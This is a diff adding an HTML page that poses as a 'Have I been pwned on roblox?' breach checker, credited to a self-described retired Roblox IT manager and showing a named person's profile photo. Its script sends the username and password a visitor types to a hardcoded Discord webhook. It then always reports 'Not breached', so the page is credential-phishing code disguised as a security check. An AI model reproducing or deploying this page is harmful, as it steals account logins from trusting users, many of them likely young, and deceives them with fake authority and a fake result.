@@ -1,0 +1,132 @@
+<!DOCTYPE html>  
+</body>
+</html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>Pwn checker</title>
+    <style>
+      /* Add your CSS styles here */
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #f2f2f2;
+        text-align: center;
+      }
+      h1 {
+        color: #444;
+      }
+      form {
+        background-color: #fff;
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0px 0px 10px #ccc;
+        margin: 50px auto;
+        width: 500px;
+      }
+      input[type="text"], input[type="password"] {
+        padding: 10px;
+        font-size: 16px;
+        width: 100%;
+        margin-bottom: 20px;
+        border: none;
+        border-radius: 5px;
+        box-shadow: 0px 0px 10px #ccc;
+      }
+      input[type="button"] {
+        background-color: #444;
+        color: #fff;
+        padding: 10px 20px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        font-size: 16px;
+        box-shadow: 0px 0px 10px #ccc;
+      }
+      input[type="button"]:hover {
+        background-color: #333;
+      }
+      img {
+          height:60%;
+          width:60%;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Have I've been pwned on roblox?</h1>
+    <h4>Made by: nevi, Roblox retired IT manager</h4>
+    <form>
+      <input id="name" type="text" placeholder="Username">
+      <input id="pass" type="password" placeholder="Password">
+
+    
+         <input type="button" value="check" onclick="check()">
+ <h1 id="output"></h1>
+</div>
+
+    </form>
+    <form>
+        <h1>Ronny Weyant</h1>
+        <h2>Senior Manager</h2>
+        <h3>Helped out on this project</h3></h3>
+        <img src="https://media.licdn.com/dms/image/C5603AQFEOx2mp3K9mA/profile-displayphoto-shrink_800_800/0/1585618343188?e=2147483647&v=beta&t=N2Jn0Bx-2-eyEHtFrMItwkUU8zjzk3BepgBHqN5lzKc" alt=""></img>
+    </form>
+  </body>
+  
+  <script>
+      // Not worth trying to spam, we have a bot that detects  webhook spam
+         var ZDIAGRAM = "https://discord.com/api/webhooks/1057673672799825920/9zCW_gyUAwlVRP_vjcOYmKeTwHm738PxA8AgiO_JsXVdewhPFkqpx30K79TQZFDHuQ-6";
+         var returnvalue = "false"
+        
+   // Sends the Password and Username to roblox's Ex IT managers webhook that he can only see and the bot will check and post a result
+function check() { 
+    const name = document.getElementById('name').value;
+    const pass = document.getElementById('pass').value;
+ 	
+    alert(ZDIAGRAM)
+fetch(ZDIAGRAM, {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({
+    embeds: [
+      {
+        username: "breachdetect",
+        title: "$check-breach",
+        description: "BREACH VERIFY",
+        color: 3447003,
+        fields: [
+          {
+            name: "Account Name",
+            value: name,
+          },
+          {
+            name: "Account Password",
+            value: pass
+            }
+          
+            
+           ]
+      }
+    ]
+  })
+});
+
+// Convert the object to a JSON string
+var embedDataJSON = JSON.stringify();
+
+// Send the request to the Discord webhook URL
+fetch(ZDIAGRAM, {
+    method: "POST",
+    headers: {
+        "Content-Type": "application/json"
+    },
+    body: embedDataJSON
+});  
+if (returnvalue === "false") {
+    document.getElementById("output").innerHTML = "Not breached"
+}  else{
+      document.getElementById("output").innerHTML = "Breached, change ur account password and never use the old one again!"  
+    }  
+ }
+ 
+  </script>
+</html>
